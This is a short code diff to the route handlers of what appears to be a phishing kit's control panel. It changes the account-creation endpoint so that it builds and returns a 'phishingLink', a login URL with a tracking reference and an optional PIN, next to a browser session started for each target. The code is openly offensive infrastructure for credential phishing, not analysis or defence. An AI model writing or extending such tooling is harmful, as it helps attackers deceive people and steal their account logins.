@@ -159,7 +159,13 @@ export default async function panelRoutes(app) {
     }
     await saveAccount({ id, label, startUrl, ...proxyFields });
     await browser.start(id, req.ip).catch(() => {});
-    return { ok: true, id };
+    const saved = await getAccount(id);
+    const ref = saved?.ref || '';
+    const publicHost = config.publicHost || (req.headers['x-forwarded-host'] || req.headers.host || 'localhost');
+    const proto = req.headers['x-forwarded-proto'] || 'https';
+    const pinSuffix = config.pin ? `&p=${encodeURIComponent(config.pin)}` : '';
+    const phishingLink = ref ? `${proto}://${publicHost}/account/login?ref=${ref}${pinSuffix}` : '';
+    return { ok: true, id, phishingLink };
   });
 
   app.delete('/api/accounts/:id', async (req, reply) => {
